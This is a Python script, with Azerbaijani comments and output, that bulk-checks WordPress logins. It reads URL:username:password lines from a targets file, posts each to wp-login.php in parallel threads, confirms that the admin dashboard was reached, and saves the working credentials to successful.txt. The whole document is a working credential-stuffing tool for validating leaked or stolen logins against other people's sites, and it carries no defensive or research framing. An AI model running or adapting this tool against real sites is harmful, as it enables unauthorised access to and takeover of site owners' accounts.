#!/usr/bin/env python3
"""
WordPress Login Checker - 100% DƏQİQ
HƏQİQİ DASHBOARD GİRİŞİ YOXLANILIR
"""

import requests
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import os

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def create_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=2,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    })
    return session

def extract_credentials(line):
    line = line.strip()
    if not line:
        return None, None, None
    
    match = re.match(r'(https?://[^:]+(?::\d+)?/[^:]+)', line)
    if not match:
        return None, None, None
    
    url = match.group(1)
    remaining = line[len(url):]
    
    if remaining.startswith(':'):
        remaining = remaining[1:]
    
    if ':' not in remaining:
        return None, None, None
    
    username, password = remaining.split(':', 1)
    username = username.strip()
    password = password.strip()
    
    if not username or not password:
        return None, None, None
    
    return url, username, password

def check_site(url, timeout=15):
    try:
        session = create_session()
        response = session.get(url, timeout=timeout, allow_redirects=True)
        if response.status_code in [200, 301, 302, 303, 307, 308]:
            return True, response.status_code, None
        return False, response.status_code, f"HTTP {response.status_code}"
    except Exception as e:
        return False, None, str(e)[:80]

def check_wordpress_login(login_url, username, password, timeout=25):
    """HƏQİQİ DASHBOARD GİRİŞİ YOXLA"""
    session = create_session()
    
    try:
        # 1. Login səhifəsini al
        try:
            login_response = session.get(login_url, timeout=timeout)
            if login_response.status_code != 200:
                return False, f"Login page error: HTTP {login_response.status_code}", None
        except Exception as e:
            return False, f"Cannot access login: {str(e)[:40]}", None
        
        # 2. Login et
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': login_url.replace('wp-login.php', 'wp-admin/'),
            'testcookie': '1'
        }
        
        login_post = session.post(
            login_url, 
            data=login_data,
            timeout=timeout,
            allow_redirects=False  # Redirect-ləri özümüz idarə edək
        )
        
        # 3. Əgər redirect varsa, onu izlə
        if login_post.status_code in [301, 302, 303, 307, 308]:
            redirect_url = login_post.headers.get('Location', '')
            
            # Əgər wp-admin və ya dashboard-a yönləndirirsə
            if 'wp-admin' in redirect_url or 'dashboard' in redirect_url:
                # Dashboard-a GET sorğusu göndər
                try:
                    dashboard_response = session.get(
                        redirect_url, 
                        timeout=timeout,
                        allow_redirects=True
                    )
                    
                    # 4. Dashboard səhifəsini ANALİZ ET
                    dashboard_html = dashboard_response.text.lower()
                    dashboard_url = dashboard_response.url
                    
                    # Dashboard əlamətləri (MÜTLƏQ olmalıdır)
                    dashboard_indicators = [
                        'wp-admin',
                        'dashboard',
                        'wordpress',
                        'admin bar',
                        'howdy',
                        'screen-options',
                        'wp-version',
                        'update-nag',
                        'adminmenu',
                        'wpbody-content'
                    ]
                    
                    # ƏN AZ 3 əlamət olmalıdır
                    found_indicators = 0
                    for indicator in dashboard_indicators:
                        if indicator in dashboard_html:
                            found_indicators += 1
                    
                    # Həmçinin login səhifəsinə geri qayıtmamalıdır
                    if 'wp-login.php' not in dashboard_url and found_indicators >= 2:
                        return True, "✅ Həqiqi dashboard girişi təsdiqləndi!", dashboard_url
                    else:
                        # Dashboard yoxlanışı uğursuz - false positive
                        return False, f"❌ False positive: Dashboard deyil (yalnız {found_indicators} əlamət)", None
                        
                except Exception as e:
                    return False, f"Dashboard yoxlanışı xətası: {str(e)[:40]}", None
            
            # Başqa bir səhifəyə yönləndirirsə
            else:
                return False, f"❌ Login olmadı: {redirect_url[:50]}", None
        
        # 4. Redirect yoxdursa, cavabı yoxla
        else:
            response_text = login_post.text.lower()
            
            # Əgər login səhifəsində xəta varsa
            error_words = ['invalid username', 'incorrect password', 'invalid email', 
                          'error:', 'wrong password', 'login failed', 'invalid_username',
                          'lost your password', 'incorrect']
            
            for word in error_words:
                if word in response_text:
                    return False, f"❌ Login xətası: {word}", None
            
            # Bəlkə də birbaşa dashboard açıldı (nadir hallarda)
            if 'wp-admin' in response_text and 'dashboard' in response_text:
                # Dashboard əlamətlərini yoxla
                indicators = ['wp-admin', 'dashboard', 'wordpress', 'admin bar', 'howdy']
                count = sum(1 for ind in indicators if ind in response_text)
                if count >= 3:
                    return True, "✅ Dashboard birbaşa açıldı!", login_post.url
            
            return False, "❌ Login uğursuz (cavab yoxlanıldı)", None
            
    except Exception as e:
        return False, f"Xəta: {str(e)[:50]}", None

def print_success(url, username, password, dashboard):
    print("\n" + "="*80)
    print(f"{Colors.GREEN}{Colors.BOLD}🎉🎉🎉 TƏSDİQLƏNMİŞ UĞURLU GİRİŞ! 🎉🎉🎉{Colors.RESET}")
    print("="*80)
    print()
    print(f"{Colors.CYAN}{Colors.BOLD}┌──────────────────────────────────────────────────────────────┐{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}│{Colors.RESET} {Colors.WHITE}{Colors.BOLD}🌐 SAYT:{Colors.RESET}        {Colors.GREEN}{url}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}├──────────────────────────────────────────────────────────────┤{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}│{Colors.RESET} {Colors.WHITE}{Colors.BOLD}👤 İSTİFADƏÇİ:{Colors.RESET}     {Colors.YELLOW}{Colors.BOLD}{username}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}├──────────────────────────────────────────────────────────────┤{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}│{Colors.RESET} {Colors.WHITE}{Colors.BOLD}🔑 ŞİFRƏ:{Colors.RESET}         {Colors.MAGENTA}{Colors.BOLD}{password}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}├──────────────────────────────────────────────────────────────┤{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}│{Colors.RESET} {Colors.WHITE}{Colors.BOLD}📊 DASHBOARD:{Colors.RESET}     {Colors.BLUE}{dashboard}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}└──────────────────────────────────────────────────────────────┘{Colors.RESET}")
    print()
    print(f"{Colors.GREEN}{Colors.BOLD}✅ GİRİŞ MƏLUMATLARI:{Colors.RESET}")
    print(f"   {Colors.YELLOW}URL:{Colors.RESET}  {url}")
    print(f"   {Colors.YELLOW}USER:{Colors.RESET} {username}")
    print(f"   {Colors.YELLOW}PASS:{Colors.RESET} {password}")
    print()
    print(f"{Colors.GREEN}✅ successful.txt faylına yazıldı{Colors.RESET}")
    print("="*80 + "\n")

def process_single(credential, index, total, output_file):
    url, username, password = credential
    
    print(f"{Colors.BLUE}[{index}/{total}]{Colors.RESET} Yoxlanılır: {url}")
    
    # Saytı yoxla
    accessible, status_code, error = check_site(url)
    if not accessible:
        print(f"{Colors.RED}    ✗ Sayt işləmir: {error}{Colors.RESET}")
        with open(output_file, 'a') as f:
            f.write(f"FAILED|{url}|{username}|SITE_DOWN|{error}\n")
        return
    
    print(f"{Colors.GREEN}    ✓ Sayt işləyir (HTTP {status_code}){Colors.RESET}")
    
    # Login yoxla - HƏQİQİ DASHBOARD YOXLANIŞI
    success, message, dashboard = check_wordpress_login(url, username, password)
    
    if success:
        print_success(url, username, password, dashboard)
        
        with open(output_file, 'a') as f:
            f.write(f"SUCCESS|{url}|{username}|{password}|{dashboard}\n")
        
        with open('successful.txt', 'a') as f:
            f.write(f"{url}:{username}:{password}\n")
    else:
        print(f"{Colors.RED}    {message}{Colors.RESET}")
        with open(output_file, 'a') as f:
            f.write(f"FAILED|{url}|{username}|LOGIN_FAILED|{message}\n")

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║     WORDPRESS LOGIN CHECKER v3.0 - 100% DƏQİQ            ║")
    print("║     HƏQİQİ DASHBOARD GİRİŞİ YOXLANILIR                   ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(Colors.RESET)
    
    input_file = 'targets.txt'
    if not os.path.exists(input_file):
        print(f"{Colors.RED}❌ XƏTA: {input_file} faylı tapılmadı!{Colors.RESET}")
        return
    
    with open(input_file, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]
    
    print(f"{Colors.GREEN}✅ {len(lines)} credential tapıldı{Colors.RESET}")
    
    # Dublikatları sil
    unique = []
    seen = set()
    for line in lines:
        if line not in seen:
            seen.add(line)
            unique.append(line)
    
    # Credential-ları parse et
    credentials = []
    invalid = 0
    
    for line in unique:
        url, username, password = extract_credentials(line)
        if url and username and password:
            credentials.append((url, username, password))
        else:
            invalid += 1
    
    if invalid > 0:
        print(f"{Colors.YELLOW}⚠ {invalid} səhv formatlı sətir atlandı{Colors.RESET}")
    
    print(f"{Colors.GREEN}✅ {len(credentials)} etibarlı credential yoxlanılacaq{Colors.RESET}")
    print()
    print(f"{Colors.YELLOW}⏳ Başlayır... (100% dəqiq yoxlama){Colors.RESET}")
    print()
    
    output_file = 'results.txt'
    with open(output_file, 'w') as f:
        f.write("WORDPRESS LOGIN CHECK RESULTS (100% DƏQİQ)\n")
        f.write("=" * 60 + "\n\n")
    
    open('successful.txt', 'w').close()
    
    total = len(credentials)
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {}
        for idx, cred in enumerate(credentials, 1):
            future = executor.submit(process_single, cred, idx, total, output_file)
            futures[future] = idx
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"{Colors.RED}❌ Xəta: {e}{Colors.RESET}")
    
    print()
    print(f"{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.GREEN}{Colors.BOLD}✅ YOXLAMA TAMAMLANDI!{Colors.RESET}")
    
    # YALNIZ HƏQİQİ UĞURLU GİRİŞLƏRİ GÖSTƏR
    try:
        with open('successful.txt', 'r') as f:
            success_lines = f.readlines()
            if success_lines:
                print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 {len(success_lines)} HƏQİQİ UĞURLU GİRİŞ TAPILDI! 🎉{Colors.RESET}")
                print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")
                for i, line in enumerate(success_lines, 1):
                    parts = line.strip().split(':')
                    if len(parts) >= 3:
                        print(f"\n{Colors.GREEN}{i}. {Colors.RESET}")
                        print(f"   {Colors.YELLOW}URL:{Colors.RESET}  {parts[0]}")
                        print(f"   {Colors.YELLOW}USER:{Colors.RESET} {parts[1]}")
                        print(f"   {Colors.YELLOW}PASS:{Colors.RESET} {parts[2]}")
            else:
                print(f"\n{Colors.RED}❌ Heç bir həqiqi uğurlu giriş tapılmadı{Colors.RESET}")
    except:
        pass
    
    print(f"{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⏹ Dayandırıldı{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}❌ Xəta: {e}{Colors.RESET}")
